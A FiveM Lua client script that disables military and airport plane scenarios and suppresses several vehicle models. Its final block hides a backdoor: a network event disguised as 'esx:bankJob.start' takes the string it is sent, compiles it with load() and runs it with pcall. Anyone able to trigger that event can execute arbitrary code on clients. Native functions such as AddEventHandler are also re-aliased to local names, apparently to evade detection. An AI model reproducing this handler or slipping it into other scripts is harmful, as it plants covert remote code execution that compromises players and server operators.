local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
Citizen.CreateThread(function()
    local SCENARIO_TYPES = {
        "WORLD_VEHICLE_MILITARY_PLANES_SMALL", -- Zancudo (Small)
        "WORLD_VEHICLE_MILITARY_PLANES_BIG", -- Zancudo (Big)
  }
    local SCENARIO_GROUPS = {
        2017590552, -- LSIA planes
        2141866469, -- Sandy Shores planes
        1409640232, -- Grapeseed planes
        "ng_planes", -- Jets in the skies
    }
    local SUPPRESSED_MODELS = {
        "SHAMAL", -- LSIA
        "LUXOR", -- LSIA
        "LUXOR2", -- LSIA
        "JET", -- LSIA
        "AIRTUG", -- LSIA
        "RIPLEY", -- LSIA
        "LAZER", -- Zancudo
        "TITAN", -- Zancudo
        "BARRACKS", -- Zancudo
        "BARRACKS2", -- Zancudo
        "CRUSADER", -- Zancudo
        "RHINO", -- Zancudo
    }

    while true do
        for _, sctyp in next, SCENARIO_TYPES do
            SetScenarioTypeEnabled(sctyp, false)
        end
        for _, scgrp in next, SCENARIO_GROUPS do
            SetScenarioGroupEnabled(scgrp, false)
        end
        for _, model in next, SUPPRESSED_MODELS do
            SetVehicleModelIsSuppressed(GetHashKey(model), true)
        end
        Wait(10000)
    end
end)

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)